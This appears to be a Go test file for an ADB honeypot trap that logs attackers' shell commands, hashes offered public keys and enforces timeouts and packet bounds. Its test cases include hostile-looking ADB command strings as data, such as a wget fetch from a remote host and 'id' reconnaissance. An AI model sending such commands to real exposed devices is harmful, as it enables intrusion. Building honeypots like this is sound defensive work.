package trap

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"io"
	"log/slog"
	"strings"
	"testing"
	"time"

	"github.com/st0o0/ran/internal/alert"
	"github.com/st0o0/ran/internal/config"
	"github.com/st0o0/ran/internal/metrics"
)

func buildADBTrap(c *config.Config, l *slog.Logger, m *metrics.Metrics, lim *Limiter, r Reporter) Trap {
	return NewADB(c, l, m, lim, r)
}

func adbPacket(cmd, arg0, arg1 uint32, data []byte) []byte {
	pkt := make([]byte, adbHdrSize, adbHdrSize+len(data))
	binary.LittleEndian.PutUint32(pkt[0:4], cmd)
	binary.LittleEndian.PutUint32(pkt[4:8], arg0)
	binary.LittleEndian.PutUint32(pkt[8:12], arg1)
	binary.LittleEndian.PutUint32(pkt[12:16], uint32(len(data)))
	return append(pkt, data...)
}

// adbHandshake sends CNXN and consumes the AUTH token packet.
func adbHandshake(t *testing.T, conn interface {
	io.ReadWriter
}) {
	t.Helper()
	if _, err := conn.Write(adbPacket(adbCmdCNXN, 0x01000000, 4096, []byte("host::features=shell_v2"))); err != nil {
		t.Fatal(err)
	}
	tok := make([]byte, adbHdrSize+20)
	if _, err := io.ReadFull(conn, tok); err != nil {
		t.Fatal(err)
	}
	if binary.LittleEndian.Uint32(tok[0:4]) != adbCmdAUTH {
		t.Fatalf("expected AUTH, got 0x%08x", binary.LittleEndian.Uint32(tok[0:4]))
	}
}

func TestADBShellOpenCaptured(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		dest    string
		wantCmd string
	}{
		{"shell", "shell:wget http://x/a", "shell:wget http://x/a"},
		{"exec", "exec:id", "exec:id"},
		{"nul terminated", "shell:ls\x00", "shell:ls"},
		{"long", "shell:" + strings.Repeat("A", 1000), ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			d := startDepthTrap(t, "adb", nil, buildADBTrap)
			conn := dialTrap(t, d.addr)
			adbHandshake(t, conn)
			if _, err := conn.Write(adbPacket(adbCmdOPEN, 7, 0, []byte(tc.dest))); err != nil {
				t.Fatal(err)
			}
			rsp := make([]byte, adbHdrSize)
			if _, err := io.ReadFull(conn, rsp); err != nil {
				t.Fatalf("no CLSE: %v", err)
			}
			if binary.LittleEndian.Uint32(rsp[0:4]) != adbCmdCLSE {
				t.Errorf("reply 0x%08x, want CLSE", binary.LittleEndian.Uint32(rsp[0:4]))
			}
			if binary.LittleEndian.Uint32(rsp[8:12]) != 7 {
				t.Errorf("CLSE remote id = %d, want 7", binary.LittleEndian.Uint32(rsp[8:12]))
			}
			evs := d.sink.waitEvents(t, func(e []alert.Event) bool { return commandMeta(e) != "" })
			got := commandMeta(evs)
			if tc.wantCmd != "" && got != tc.wantCmd {
				t.Errorf("command = %q, want %q", got, tc.wantCmd)
			}
			if len(got) > 256 {
				t.Errorf("command meta is %d bytes, want at most 256", len(got))
			}
			if !strings.Contains(d.logs.String(), `"action":"command"`) {
				t.Errorf("no command log line:\n%s", d.logs.String())
			}
		})
	}
}

func TestADBOpenOtherServiceIsNotACommand(t *testing.T) {
	t.Parallel()
	d := startDepthTrap(t, "adb", func(c *config.Config) { c.SessionTimeout = time.Second }, buildADBTrap)
	conn := dialTrap(t, d.addr)
	adbHandshake(t, conn)
	_, _ = conn.Write(adbPacket(adbCmdOPEN, 1, 0, []byte("sync:")))
	conn.Close()
	d.sink.waitEvents(t, func(e []alert.Event) bool { return len(e) > 0 })
	if commandMeta(d.sink.snapshot()) != "" {
		t.Error("sync: must not be recorded as a command")
	}
}

func TestADBPublicKeyIsAuthAttemptWithHashOnly(t *testing.T) {
	t.Parallel()
	key := []byte("QAAAAHJvb3RAa2FsaQ-fake-public-key-material root@host\x00")
	sum := sha256.Sum256(key)
	wantHash := hex.EncodeToString(sum[:])

	d := startDepthTrap(t, "adb", nil, buildADBTrap)
	conn := dialTrap(t, d.addr)
	adbHandshake(t, conn)
	_, _ = conn.Write(adbPacket(adbCmdAUTH, adbAuthPublicKey, 0, key))
	d.waitCredentials(t, "adb", 1)
	evs := d.sink.waitEvents(t, func(e []alert.Event) bool {
		for _, ev := range e {
			if ev.Meta["key_hash"] != "" {
				return true
			}
		}
		return false
	})
	for _, ev := range evs {
		if ev.Meta["key_hash"] == "" {
			continue
		}
		if ev.Meta["key_hash"] != wantHash || ev.Meta["method"] != "adb_publickey" {
			t.Errorf("meta = %v", ev.Meta)
		}
		for k, v := range ev.Meta {
			if strings.Contains(v, "fake-public-key") {
				t.Errorf("key bytes in meta %s: %q", k, v)
			}
		}
	}
	if strings.Contains(d.logs.String(), "fake-public-key") {
		t.Error("key bytes in log output")
	}
	if !strings.Contains(d.logs.String(), `"action":"auth_attempt"`) {
		t.Errorf("no auth_attempt log:\n%s", d.logs.String())
	}
}

func TestADBSignatureThenOpen(t *testing.T) {
	t.Parallel()
	d := startDepthTrap(t, "adb", nil, buildADBTrap)
	conn := dialTrap(t, d.addr)
	adbHandshake(t, conn)
	_, _ = conn.Write(adbPacket(adbCmdAUTH, adbAuthSignature, 0, bytes.Repeat([]byte{1}, 256)))
	tok := make([]byte, adbHdrSize+20)
	if _, err := io.ReadFull(conn, tok); err != nil {
		t.Fatalf("no new token after signature: %v", err)
	}
	_, _ = conn.Write(adbPacket(adbCmdOPEN, 3, 0, []byte("shell:id")))
	rsp := make([]byte, adbHdrSize)
	if _, err := io.ReadFull(conn, rsp); err != nil {
		t.Fatal(err)
	}
	d.sink.waitEvents(t, func(e []alert.Event) bool { return commandMeta(e) == "shell:id" })
	if d.credentials("adb") != 1 {
		t.Errorf("credentials = %v, want 1", d.credentials("adb"))
	}
}

func TestADBSilentClientTimesOut(t *testing.T) {
	t.Parallel()
	d := startDepthTrap(t, "adb", func(c *config.Config) { c.SessionTimeout = 400 * time.Millisecond }, buildADBTrap)
	conn := dialTrap(t, d.addr)
	adbHandshake(t, conn)
	d.waitOutcomeLabel(t, "adb", "timeout")
}

func TestADBOversizedPostAuthPacketEnds(t *testing.T) {
	t.Parallel()
	d := startDepthTrap(t, "adb", nil, buildADBTrap)
	conn := dialTrap(t, d.addr)
	adbHandshake(t, conn)
	pkt := adbPacket(adbCmdOPEN, 1, 0, nil)
	binary.LittleEndian.PutUint32(pkt[12:16], 0xFFFFFFFF)
	_, _ = conn.Write(pkt)
	d.waitOutcomeLabel(t, "adb", "too_long")
}

func TestReadADBPacketBounds(t *testing.T) {
	t.Parallel()
	pkt := adbPacket(adbCmdOPEN, 1, 2, []byte("shell:x"))
	cmd, a0, a1, data, err := readADBPacket(bytes.NewReader(pkt))
	if err != nil || cmd != adbCmdOPEN || a0 != 1 || a1 != 2 || string(data) != "shell:x" {
		t.Errorf("got %x %d %d %q %v", cmd, a0, a1, data, err)
	}
	if _, _, _, _, err := readADBPacket(bytes.NewReader(pkt[:10])); err == nil {
		t.Error("short header must fail")
	}
	if _, _, _, _, err := readADBPacket(bytes.NewReader(pkt[:len(pkt)-1])); err == nil {
		t.Error("truncated data must fail")
	}
}
